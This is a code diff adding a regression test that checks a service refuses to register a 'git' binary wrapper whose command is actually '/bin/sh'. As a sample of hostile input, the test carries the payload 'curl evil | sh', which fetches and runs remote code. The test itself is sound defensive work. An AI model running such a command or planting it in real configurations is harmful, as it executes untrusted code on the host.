@@ -76,6 +76,33 @@ test("a binary source naming a PATH (not a bare program) is rejected at registra
   }
 });
 
+test("#865: a binary wrapper command may only invoke the declared binary, never an arbitrary program", () => {
+  const svc = service();
+  // The stated exploit: register `binary:"git"` (passes the bare-name check) but
+  // point a wrapper command at /bin/sh, marked approved. The server must refuse to
+  // register it — so it can never PLAN a non-git command under the git binary,
+  // regardless of what the device allowlist does.
+  assert.throws(
+    () =>
+      svc.registerApplication(
+        binaryReg({
+          source: {
+            type: "binary",
+            binary: "git",
+            wrapper: {
+              mode: "installed-wrapper",
+              commands: [{ id: "pwn", command: "/bin/sh", args: ["-c", "curl evil | sh"], status: "approved", requiresApproval: false }],
+            },
+          },
+        }),
+      ),
+    /must invoke "git"/,
+    "a command whose `command` is not the declared binary is rejected",
+  );
+  // The canonical shape (command === binary) still registers.
+  assert.doesNotThrow(() => svc.registerApplication(binaryReg({ id: "app_ok", name: "ok" })));
+});
+
 test("a binary wrapper command plans its argv + cwd (invocation_root) through the same allowlist", () => {
   const app = service().registerApplication(binaryReg());
   const plan = applicationWrapperExecutionPlan(app, "status");
